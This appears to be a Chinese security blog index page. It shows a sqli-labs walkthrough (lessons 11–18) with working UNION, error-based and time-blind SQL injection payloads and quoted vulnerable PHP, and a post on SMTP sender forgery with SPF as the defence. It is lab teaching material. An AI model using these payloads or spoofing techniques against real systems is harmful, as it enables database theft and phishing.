
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>likesoso - 随便写写</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <!-- Set render engine for 360 browser -->
  <meta name="renderer" content="webkit">
  <!-- No Baidu Siteapp-->
  <meta http-equiv="Cache-Control" content="no-siteapp"/>
  <meta property="og:type" content="website">
<meta property="og:title" content="likesoso - 随便写写">
<meta property="og:url" content="http://likesoso.github.io/index.html">
<meta property="og:site_name" content="likesoso - 随便写写">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="likesoso">
<meta name="twitter:card" content="summary">
  
  
    <link rel="icon" href="/img/likesoso.jpg">
    <meta name="mobile-web-app-capable" content="yes">
    <!-- Add to homescreen for Chrome on Android -->    
    <link rel="icon" sizes="192x192" href="/img/likesoso.jpg">
    <!-- Add to homescreen for Safari on iOS -->
    <link rel="apple-touch-icon-precomposed" href="/img/likesoso.jpg">    
    <!-- Tile icon for Win8 (144x144 + tile color) -->
    <meta name="msapplication-TileImage" content="/img/likesoso.jpg">
    <meta name="msapplication-TileColor" content="#0e90d2">
  
  
<link rel="stylesheet" href="/css/style.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
  
<script type="text/javascript">
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?10f2720e6f47d1b4a5ebc811df8dc361";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>

<meta name="generator" content="Hexo 5.1.1"></head>
<body>
<div id="container">
  <div id="wrap">
    <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">likesoso - 随便写写</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">首页</a>
        
          <a class="main-nav-link" href="/archives">文章</a>
        
          <a class="main-nav-link" href="/about">关于</a>
        
      </nav>
      <!--
      <nav id="sub-nav">
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
          <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="Search">
          <input type="submit" value="" class="search-form-submit">
          <input name=tn type=hidden value="bds">
          <input name=cl type=hidden value="3">
          <input name=ct type=hidden value="2097152">
          <input type="hidden" name="si" value="likesoso.github.io">
        </form>
      </div>
      -->
    </div>
  </div>
</header>
    <div class="outer">
      <section id="main">
  
    <article id="post-sqli-labs教程-4" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/" class="article-date">
  <time datetime="2020-10-09T06:48:06.000Z" itemprop="datePublished">2020-10-09</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/sqli/">sqli</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/">sqli-labs教程(4)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- Table of Contents -->
        
        <h1 id="Less11"><a href="#Less11" class="headerlink" title="Less11"></a>Less11</h1><p><img src="/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-1.jpg"></p>
<p>简单的登录框，判断为post类型的注入。随便键入数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;&#x2F;123456</span><br></pre></td></tr></table></figure>

<p>根据报错：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;123456&#39; LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>

<p>order by 加 union 判断回显后，构造poc：</p>
<p>爆库名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123&#39;+Union+Select+1,database()+#</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-2.jpg"></p>
<h1 id="Less12"><a href="#Less12" class="headerlink" title="Less12"></a>Less12</h1><p>跟Less11一样，只是不使用单引号触发，而是用<code>&quot;)</code>触发</p>
<p><img src="/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-3.jpg"></p>
<h1 id="Less13"><a href="#Less13" class="headerlink" title="Less13"></a>Less13</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">123&#39;) or 1&#x3D;1 #		&#x2F;&#x2F;登陆成功</span><br><span class="line">123&#39;) or 1&#x3D;2 #		&#x2F;&#x2F;登陆失败</span><br></pre></td></tr></table></figure>
<p>order by 判断出有2个字段后，页面没有回显位。考虑使用extractvalue构造poc：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;123&#39;)+and+extractvalue(0x0a,concat(0x0a,(SELECT+schema_name+FROM+INFORMATION_SCHEMA.SCHEMATA+limit+4,1)))#&amp;passwd&#x3D;123456&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-4.jpg"></p>
<h1 id="Less14"><a href="#Less14" class="headerlink" title="Less14"></a>Less14</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">123&quot; or 1&#x3D;1 #		       &#x2F;&#x2F;登陆成功</span><br><span class="line">123&quot; or 1&#x3D;2 #			&#x2F;&#x2F;登陆失败</span><br></pre></td></tr></table></figure>
<p>由此判断，提交的参数被双引号包裹了起来，其他的跟Less13一致，构造POC：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;123&quot;+and+extractvalue(0x0a,concat(0x0a,(SELECT+schema_name+FROM+INFORMATION_SCHEMA.SCHEMATA+limit+4,1)))#&amp;passwd&#x3D;123456&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-5.jpg"></p>
<h1 id="Less15"><a href="#Less15" class="headerlink" title="Less15"></a>Less15</h1><p>没有任何响应，构造poc：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123&#39; or sleep(5) #</span><br></pre></td></tr></table></figure>
<p>使用延时注入，这里有个产生了一个问题。我们查看源码后得到sql语句为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE username&#x3D;&#39;$uname&#39; and password&#x3D;&#39;$passwd&#39; LIMIT 0,1</span><br></pre></td></tr></table></figure>
<p>如果我们采用上面的poc，生效的部分为：</p>
<p><code>SELECT username, password FROM users WHERE username=&#39;123&#39; or sleep(5)</code></p>
<p>很长时间没有响应、数据库一直在sleep，远远超过了5秒，达到了65s。</p>
<p><img src="/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-6.jpg"></p>
<p>经分析这个语句遍历了整个users表，每次都执行了or后面的sleep。导致users表中有多少行，sleep就被执行了多少次。</p>
<p><img src="/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-7.jpg"></p>
<p>这就是响应时间超长的原因，修改poc：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; or sleep(5) #</span><br></pre></td></tr></table></figure>
<p>让where前半段可以查询到用户名admin，即可；构造poc</p>
<p>数据库长度：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39;+and+if(length(database()&#x3D;8),sleep(5),1)#&amp;passwd&#x3D;123456&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-8.jpg"></p>
<p>其他的爆破exp如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">爆数据库名：</span><br><span class="line">uname=admin&#x27;+and+if(left(database(),1)=&#x27;s&#x27;,sleep(5),1)<span class="comment">#&amp;passwd=123456&amp;submit=Submit</span></span><br><span class="line">爆破表名：</span><br><span class="line">uname=admin&#x27;+and+if(left(((<span class="keyword">select</span>+table_name+<span class="keyword">from</span>+information_schema.tables+<span class="keyword">where</span>+table_schema=<span class="keyword">database</span>()+<span class="keyword">LIMIT</span>+<span class="number">0</span>,<span class="number">1</span>)),<span class="number">1</span>)=<span class="string">&#x27;e&#x27;</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>)<span class="comment">#&amp;passwd=123456&amp;submit=Submit</span></span><br><span class="line">爆破列名：</span><br><span class="line">uname=<span class="keyword">admin</span><span class="string">&#x27;+and+if(left((select+column_name+from+information_schema.columns+where+table_name%3d&#x27;</span><span class="keyword">users</span><span class="string">&#x27;+and+table_schema+=+&#x27;</span><span class="keyword">security</span><span class="string">&#x27;+LIMIT+0,1),1)=&#x27;</span>i<span class="string">&#x27;,sleep(5),1)#&amp;passwd=123456&amp;submit=Submit</span></span><br><span class="line"><span class="string">爆破字段内容：</span></span><br><span class="line"><span class="string">uname=admin&#x27;</span><span class="keyword">and</span>+<span class="keyword">if</span>(<span class="keyword">left</span>((<span class="keyword">select</span>+<span class="keyword">id</span>+<span class="keyword">from</span>+<span class="keyword">users</span>+<span class="keyword">limit</span>+<span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>)=<span class="string">&#x27;1&#x27;</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>)<span class="comment">#&amp;passwd=123456&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>

<h1 id="Less16"><a href="#Less16" class="headerlink" title="Less16"></a>Less16</h1><p>反复测试发现：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">123&quot;) or 1&#x3D;1 -- -		#登陆成功</span><br><span class="line">123&quot;) or 1&#x3D;2-- -		#登陆失败</span><br></pre></td></tr></table></figure>

<p>由此判断Less16跟Less15一致，只是用双引号包含了参数。将Less15中POC的单引号改成双引号即可。</p>
<h1 id="Less17-POST-Update-Query-Error-Based-String-基于错误的更新查询POST注入"><a href="#Less17-POST-Update-Query-Error-Based-String-基于错误的更新查询POST注入" class="headerlink" title="Less17 POST - Update Query- Error Based - String (基于错误的更新查询POST注入)"></a>Less17 POST - Update Query- Error Based - String (基于错误的更新查询POST注入)</h1><p><img src="/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-9.jpg"></p>
<p>各种尝试无果，查看源码后发现check_input()中使用了get_magic_quotes_gpc()函数对参数进行过滤</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		$value = substr($value,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			$value = stripslashes($value);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">			&#123;</span><br><span class="line">			$value = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string($value) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		$value = intval($value);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> $value;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h2 id="check-in函数"><a href="#check-in函数" class="headerlink" title="check_in函数"></a>check_in函数</h2><p>限制长度、只取15个字符串<br>get_magic_quotes_gp()函数，对get、post、cookie传入数据中的单引号、双引号、反斜杠与NULL等字符添加\ 进行转义；当开启magic_quotes_gpc时，直接调用magic_quotes_gpc()返回为1，未开启返回为0</p>
<p>stripslashes()删除由 addslashes() 函数添加的反斜杠</p>
<p>ctype_digit()判断是否为数字，是数字返回1，不是返回0</p>
<p>mysql_real_escape_string(）转义sql语句中的特殊字符</p>
<p>intval() 整型转化</p>
<p>但是passwd参数并没有受到check_input()的保护:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uname=check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);  </span><br><span class="line"></span><br><span class="line">$passwd=$_POST[<span class="string">&#x27;passwd&#x27;</span>];</span><br></pre></td></tr></table></figure>

<p>修改密码的逻辑：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">@$sql=<span class="string">&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="comment">#echo $sql;</span></span><br><span class="line"></span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="comment">//echo $row;</span></span><br><span class="line">	<span class="keyword">if</span>($row)</span><br><span class="line">	&#123;</span><br><span class="line">  		</span><br><span class="line">		$row1 = $row[<span class="string">&#x27;username&#x27;</span>];  	</span><br><span class="line">		$update=<span class="string">&quot;UPDATE users SET password = &#x27;$passwd&#x27; WHERE username=&#x27;$row1&#x27;&quot;</span>;</span><br><span class="line">		mysql_query($update);</span><br><span class="line">  		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>首先确保用户名存在，在去对passwd字段做update操作。且passwd传参的时候没有check_in()函数过滤。所以我们另username=admin，然后在passwd字段上做文章，构造POC如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">库名：</span><br><span class="line">uname=admin&amp;passwd=123&#x27;+and+extractvalue(0x0a,concat(0x0a,(<span class="keyword">SELECT</span>+schema_name+<span class="keyword">FROM</span>+INFORMATION_SCHEMA.SCHEMATA+<span class="keyword">limit</span>+<span class="number">0</span>,<span class="number">1</span>)))<span class="comment">#&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-10.jpg"></p>
<h1 id="Less18-POST-Header-Injection-Uagent-field-Error-based-基于错误的用户代理，头部POST注入"><a href="#Less18-POST-Header-Injection-Uagent-field-Error-based-基于错误的用户代理，头部POST注入" class="headerlink" title="Less18 POST - Header Injection - Uagent field - Error based (基于错误的用户代理，头部POST注入)"></a>Less18 POST - Header Injection - Uagent field - Error based (基于错误的用户代理，头部POST注入)</h1><p>可以看到，页面中有显示ip address、判断为http头注入</p>
<p><img src="/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-11.png"></p>
<p>但是伪造ip，之后页面回显依旧是127.0.0.1。这里可能是用的REMOTE_ADDR，导致无法伪造：</p>
<p><img src="/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/1-12.png"></p>
<p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">	&#123;</span><br><span class="line">	$uname = check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">	$passwd = check_input($_POST[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line">	$sql=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line">	$result1 = mysql_query($sql);</span><br><span class="line">	$row1 = mysql_fetch_array($result1);</span><br><span class="line">		<span class="keyword">if</span>($row1)</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">			$insert=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;</span>;</span><br><span class="line">			mysql_query($insert);</span><br><span class="line">			<span class="comment">//echo &#x27;Your IP ADDRESS is: &#x27; .$IP;</span></span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">			<span class="comment">//echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;			</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;Your User Agent is: &#x27;</span> .$uagent;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">			print_r(mysql_error());			</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">			</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">			<span class="comment">//echo &quot;Try again looser&quot;;</span></span><br><span class="line">			print_r(mysql_error());</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;			</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;	</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>不难发现，=</p>

      
      
    </div>
    
    <footer class="article-footer">
      
        <a data-url="http://likesoso.github.io/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/" data-id="ckg3edy0k000k7es6fzch0zyl" class="article-share-link">Share</a>
      

      
        <a href="http://likesoso.github.io/2020/10/09/sqli-labs%E6%95%99%E7%A8%8B-4/#disqus_thread" class="article-comment-link">评论</a>
      

      
    </footer>
  </div>
  
</article>


  
    <article id="post-mailsender-faker" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/30/mailsender-faker/" class="article-date">
  <time datetime="2020-09-30T02:18:14.000Z" itemprop="datePublished">2020-09-30</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/mail/">mail</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/30/mailsender-faker/">mailsender_faker</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- Table of Contents -->
        
        <h1 id="社工-邮件伪造"><a href="#社工-邮件伪造" class="headerlink" title="社工-邮件伪造"></a>社工-邮件伪造</h1><h2 id="SMTP协议的原理及漏洞"><a href="#SMTP协议的原理及漏洞" class="headerlink" title="SMTP协议的原理及漏洞"></a>SMTP协议的原理及漏洞</h2><p>SMTP协议基于TCP，是一种提供可靠且有效的电子邮件传输协议。是建立在FTP文件传输服务上的一种邮件服务。主要有三个工作过程，我们使用swaks来逐步分析：</p>
<p>1.建立连接：SMTP客户端请求与服务端建立一个TCP的连接，互相通告自己的域名，同时确认对方的域名。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D; Trying mx.test.com:25...</span><br><span class="line">&#x3D;&#x3D;&#x3D; Connected to mx.test.com.</span><br><span class="line">&lt;-  220 ESMTP IMSVA	</span><br></pre></td></tr></table></figure>

<p>2.传输数据：利用命令，SMTP客户端将邮件的原地址，目的地址和邮件的具体内容传递给SMTP服务器，服务器进行响应并接受邮件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> -&gt; EHLO likesoso.com</span><br><span class="line">&lt;-  250-imsva02.ais.com</span><br><span class="line">&lt;-  250-PIPELINING</span><br><span class="line">&lt;-  250-SIZE 125829120</span><br><span class="line">&lt;-  250-ETRN</span><br><span class="line">&lt;-  250-STARTTLS</span><br><span class="line">&lt;-  250-ENHANCEDSTATUSCODES</span><br><span class="line">&lt;-  250-8BITMIME</span><br><span class="line">&lt;-  250 DSN</span><br><span class="line"> -&gt; MAIL FROM:&lt;likesoso@likesoso.com&gt;</span><br><span class="line">&lt;-  250 2.1.0 Ok</span><br><span class="line"> -&gt; RCPT TO:&lt;test@test.com&gt;</span><br><span class="line">&lt;-  250 2.1.5 Ok</span><br><span class="line"> -&gt; DATA</span><br><span class="line">&lt;-  354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</span><br><span class="line"> -&gt; Date: Wed, 30 Sep 2020 14:30:59 +0800</span><br><span class="line"> -&gt; To:test@test.com</span><br><span class="line"> -&gt; From: likesoso@likesoso.com</span><br><span class="line"> -&gt; Subject: test Wed, 30 Sep 2020 14:30:59 +0800</span><br><span class="line"> -&gt; Message-Id: &lt;20200930143059.029941@likesoso.com&gt;</span><br><span class="line"> -&gt; X-Mailer: swaks v20190914.0 jetmore.org&#x2F;john&#x2F;code&#x2F;swaks&#x2F;</span><br><span class="line"> -&gt; </span><br><span class="line"> -&gt; This is a test mailing</span><br><span class="line"> -&gt; </span><br><span class="line"> -&gt; </span><br><span class="line"> -&gt; .</span><br><span class="line">&lt;-  250 2.0.0 Ok: queued as 8B353C073</span><br></pre></td></tr></table></figure>

<p>3.释放连接：SMTP客户端发出命令，服务端接收后，关闭TCP连接。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> -&gt; QUIT</span><br><span class="line">&lt;-  221 2.0.0 Bye</span><br><span class="line">&#x3D;&#x3D;&#x3D; Connection closed with remote host.</span><br></pre></td></tr></table></figure>


<p>在传输数据的过程中不难发现，有两个from字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MAIL FROM:&lt;likesoso@likesoso.com&gt;</span><br><span class="line">From: likesoso@likesoso.com</span><br></pre></td></tr></table></figure>
<p>MAIL FROM在SMTP认证中表示邮件的发送者，FROM代表邮件内容中展示出来的发件人地址。</p>
<p><img src="/2020/09/30/mailsender-faker/1-1.jpg"></p>
<p>简单来说就是MAIL FROM是给SMTP服务器看的发件人地址，FROM是给收件人看的发件人地址。而这两个地址都是发件人可控的，服务器并没有对地址进行校验。由此攻击者可以构造MAIL FROM、达到欺骗的效果。</p>
<p><img src="/2020/09/30/mailsender-faker/1-2.jpg"></p>
<h2 id="预防方法"><a href="#预防方法" class="headerlink" title="预防方法"></a>预防方法</h2><h3 id="SPF"><a href="#SPF" class="headerlink" title="SPF"></a>SPF</h3><p>Sender Policy Framework，是一种以IP地址认证电子邮件发件人身份的技术。邮件接收方首先会去检查域名的SPF记录，来确定发件人的IP地址是否被包含在SPF记录里面，如果在，就认为是一封正确的邮件，否则会认为是一封伪造的邮件并进行退回。</p>
<p>可以看到huawei.com具备一个SPF解析记录指向 <em>v=spf1 ip4:45.249.212.32 ip4:45.249.212.35 ip4:45.249.212.255 ip4:45.249.212.187/29 ip4:45.249.212.191 ip4:185.176.76.210 ip4:168.195.93.47 ip4:103.69.140.247 -all</em></p>
<p><img src="/2020/09/30/mailsender-faker/1-3.jpg"></p>
<p>假设b.com的服务器收到了一封邮件，发送的主机是1.2.3.4，并且声称自己的MAIL FROM字段为<a href="mailto:&#x73;&#64;&#x61;&#x2e;&#x63;&#111;&#x6d;">&#x73;&#64;&#x61;&#x2e;&#x63;&#111;&#x6d;</a>。为了确认发件人是否是伪造的，邮件服务器b.com会去请求DNS服务器查询a.com的SPF记录。</p>
<p>如果：</p>
<p>a.com不存在SPF记录：则表明可以任意伪造<br>a.com存在SPF记录，且记录为1.2.3.4：邮件合法<br>a.com存在SPF记录，且记录不为1.2.3.4：进垃圾箱、显示由另一个ip代发</p>
<p><img src="/2020/09/30/mailsender-faker/1-4.jpg"></p>
<p>简单来说就是b.com服务器收信后，根据SPF记录来确定这封信的真实来源，是否跟MAIL FROM中申明的发件人的ip地址一致。</p>

      
      
    </div>
    
    <footer class="article-footer">
      
        <a data-url="http://likesoso.github.io/2020/09/30/mailsender-faker/" data-id="ckg3edy0c00087es6hwd95hzb" class="article-share-link">Share</a>
      

      
        <a href="http://likesoso.github.io/2020/09/30/mailsender-faker/#disqus_thread" class="article-comment-link">评论</a>
      

      
    </footer>
  </div>
  
</article>


  
    <article id="post-xray" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/28/xray/" class="article-date">
  <time datetime="2020-09-28T13:43:26.000Z" itemprop="datePublished">2020-09-28</time>
</a>
